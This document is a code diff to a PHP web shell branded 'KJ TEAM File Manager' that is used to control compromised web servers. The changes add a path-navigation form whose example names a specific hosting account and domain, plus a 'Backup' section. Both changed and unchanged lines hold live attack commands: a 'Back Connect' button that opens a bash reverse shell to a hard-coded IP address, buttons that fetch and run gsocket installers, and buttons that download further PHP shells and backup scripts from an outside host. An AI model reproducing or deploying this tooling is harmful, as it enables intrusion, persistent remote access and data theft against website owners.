@@ -174,23 +174,6 @@ function quarantineFile($filePath) {
     return false;
 }
 
-// ============ FUNGSI NAVIGASI ============
-function getDriveList() {
-    $drives = [];
-    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
-        for ($i = 67; $i <= 90; $i++) {
-            $drive = chr($i) . ':';
-            if (is_dir($drive . '\\')) {
-                $drives[] = $drive;
-            }
-        }
-        if (empty($drives)) {
-            $drives = ['C:', 'D:', 'E:', 'F:', 'G:', 'H:'];
-        }
-    }
-    return $drives;
-}
-
 // ============ BREADCRUMB NAVIGATOR ============
 function buildBreadcrumb($path) {
     $isWindows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
@@ -263,7 +246,7 @@ if (!isset($_SESSION['logged_in'])) {
     <html lang="id">
     <head>
         <meta charset="UTF-8">
-        <title>Login - KJ TEAM</title>
+        <title>Login - Kj TEAM</title>
         <style>
             @import url("https://fonts.googleapis.com/css2?family=Chakra+Petch:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&display=swap");
             body {
@@ -328,7 +311,7 @@ if (!isset($_SESSION['logged_in'])) {
     <body>
         <form method="POST" class="login-box">
             <img src="https://i.ibb.co/Df8g5PYb/kj.png" alt="Kj TEAM">
-            <h2>KJ TEAM PANEL</h2>
+            <h2>Kj TEAM PANEL</h2>
             <input type="text" name="username" placeholder="Username" required>
             <input type="password" name="password" placeholder="Password" required>
             <button type="submit" name="login">MASUK</button>
@@ -557,7 +540,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
     }
 
-    // Scan Backdoor - HANYA PHP, PHTML, SHTML
+    // Scan Backdoor
     if (isset($_POST['scan_backdoor'])) {
         $scanPath = $_POST['scan_path'] ?? $currentPath;
         if (!is_dir($scanPath)) {
@@ -712,7 +695,7 @@ $breadcrumb = buildBreadcrumb($currentPath);
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KJ TEAM File Manager</title>
+    <title>Kj TEAM File Manager</title>
     <style>
         @import url("https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap");
         * {
@@ -957,12 +940,60 @@ $breadcrumb = buildBreadcrumb($currentPath);
         .mt-10 { margin-top: 10px; }
         .mb-10 { margin-bottom: 10px; }
         
+        /* Custom Path Input Style */
+        .path-input-container {
+            background: #0a0e27;
+            border: 1px solid #2d4a7a;
+            border-radius: 8px;
+            padding: 10px 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .path-input-container .path-label {
+            color: #4a9eff;
+            font-size: 13px;
+            white-space: nowrap;
+        }
+        .path-input-container input[type="text"] {
+            flex: 1;
+            min-width: 200px;
+            background: #0d1117;
+            color: #88ccff;
+            border: 1px solid #2d4a7a;
+            border-radius: 5px;
+            padding: 8px 12px;
+            font-family: inherit;
+            font-size: 13px;
+        }
+        .path-input-container input[type="text"]:focus {
+            outline: none;
+            border-color: #4a9eff;
+            box-shadow: 0 0 15px rgba(74, 158, 255, 0.2);
+        }
+        .path-input-container .btn-go {
+            padding: 8px 20px;
+            background: linear-gradient(135deg, #1a3a6a, #2d4a7a);
+            color: #fff;
+            border: 1px solid #4a7aba;
+            border-radius: 5px;
+            cursor: pointer;
+            font-family: inherit;
+            transition: all 0.3s;
+        }
+        .path-input-container .btn-go:hover {
+            background: linear-gradient(135deg, #2d4a7a, #4a7aba);
+            box-shadow: 0 0 20px rgba(45, 74, 122, 0.5);
+        }
+        
         @media (max-width: 768px) {
             body { padding: 10px; }
             table { font-size: 12px; }
             td { display: block; width: 100%; }
             .breadcrumb-path-full { display: none; }
             .breadcrumb-item a { font-size: 11px; padding: 3px 6px; }
+            .path-input-container { flex-direction: column; align-items: stretch; }
         }
     </style>
     <script>
@@ -995,6 +1026,10 @@ $breadcrumb = buildBreadcrumb($currentPath);
         <a href="?d=/">🏠 Root</a>
         <span style="color:#6c8cba;">|</span>
         <span style="color:#4a9eff;">📂 <?php echo x($currentPath); ?></span>
+        <span style="color:#6c8cba;">|</span>
+        <a href="<?php echo dirname($_SERVER['PHP_SELF']) . "/" . basename(__FILE__); ?>">
+            <button class="btn btn-sm">🏠 Ke Home Shell</button>
+        </a>
     </div>
 
     <!-- MESSAGE -->
@@ -1020,6 +1055,21 @@ $breadcrumb = buildBreadcrumb($currentPath);
         <span class="breadcrumb-path-full" title="<?php echo x($currentPath); ?>">
             📍 <?php echo x($currentPath); ?>
         </span>
+    </div>
+
+    <!-- ============ CUSTOM PATH INPUT ============ -->
+    <div class="section-box">
+        <h3>📂 Navigasi Path</h3>
+        <div class="path-input-container">
+            <span class="path-label">📁 Path:</span>
+            <form method="GET" style="flex:1;display:flex;gap:8px;margin:0;flex-wrap:wrap;">
+                <input type="text" name="d" placeholder="Masukkan path (contoh: /home/u991116210/domains/dmlsjournal.online/public_html)" value="<?php echo x($currentPath); ?>" style="flex:1;min-width:200px;">
+                <button type="submit" class="btn-go">🚀 Go</button>
+            </form>
+        </div>
+        <div style="margin-top:8px;font-size:12px;color:#6c8cba;">
+            💡 Contoh: <span style="color:#4a9eff;">/home/u991116210/domains/dmlsjournal.online/public_html</span>
+        </div>
     </div>
 
     <!-- DISABLE FUNCTIONS INFO -->
@@ -1048,12 +1098,11 @@ $breadcrumb = buildBreadcrumb($currentPath);
                 <input type="hidden" name="command" value="bash -c 'exec bash -i &>/dev/tcp/209.97.168.150/5678 <&1'">
                 <button type="submit" name="run_command" class="btn btn-sm" style="border-color:#ff6b6b;">🔌 Back Connect</button>
             </form>
-            <!-- GSOCKET INSTALL -->
+            <!-- GSOCKET -->
             <form method="POST">
                 <input type="hidden" name="command" value='<?php echo 'X=' . generate_random_string() . ' bash -c "$(curl -fsSL https://gsocket.io/y)"'; ?>'>
                 <button type="submit" name="run_command" class="btn btn-sm">📡 Install Gsocket</button>
             </form>
-            <!-- GSOCKET UNINSTALL -->
             <form method="POST">
                 <input type="hidden" name="command" value='GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)";'>
                 <button type="submit" name="run_command" class="btn btn-sm btn-danger">🗑️ Uninstall Gsocket</button>
@@ -1070,6 +1119,17 @@ $breadcrumb = buildBreadcrumb($currentPath);
             <form method="POST"><input type="hidden" name="command" value="curl -sL ngtools.site/ibs/dragon.txt | tee dragon.php"><button type="submit" name="run_command" class="btn btn-sm">Dragon</button></form>
             <form method="POST"><input type="hidden" name="command" value="curl -sL ngtools.site/ibs/lapanel.txt | tee lapanel.php"><button type="submit" name="run_command" class="btn btn-sm">Lapanel</button></form>
             <form method="POST"><input type="hidden" name="command" value="curl -sL ngtools.site/ibs/adminer.txt | tee adminer.php"><button type="submit" name="run_command" class="btn btn-sm">Adminer</button></form>
+        </div>
+    </div>
+
+    <!-- BACKUP -->
+    <div class="section-box">
+        <h3>💾 Backup</h3>
+        <div class="flex-wrap">
+            <form method="POST"><input type="hidden" name="command" value="curl -sL ngtools.site/ibs/backup_journal.txt | tee backup_journal.php"><button type="submit" name="run_command" class="btn btn-sm">📓 Journal</button></form>
+            <form method="POST"><input type="hidden" name="command" value="curl -sL ngtools.site/ibs/backup_backend.txt | tee backup_backend.php"><button type="submit" name="run_command" class="btn btn-sm">⚙️ Backend</button></form>
+            <form method="POST"><input type="hidden" name="command" value="curl -sL ngtools.site/ibs/backup_code_igniter.txt | tee backup_code_igniter.php"><button type="submit" name="run_command" class="btn btn-sm">🔥 Code Igniter</button></form>
+            <form method="POST"><input type="hidden" name="command" value="curl -sL ngtools.site/ibs/backup_wp.txt | tee backup_wp.php"><button type="submit" name="run_command" class="btn btn-sm">🟦 WP</button></form>
         </div>
     </div>
 
@@ -1214,7 +1274,7 @@ $breadcrumb = buildBreadcrumb($currentPath);
     </div>
 
     <div style="text-align:center;padding:20px;color:#6c8cba;font-size:12px;border-top:1px solid #2d4a7a;margin-top:20px;">
-        KJ TEAM File Manager v2.0 | Protected Mode | Click any directory to navigate
+        Kj TEAM File Manager v2.0 | Protected Mode | Click any directory to navigate
     </div>
 </div>
 
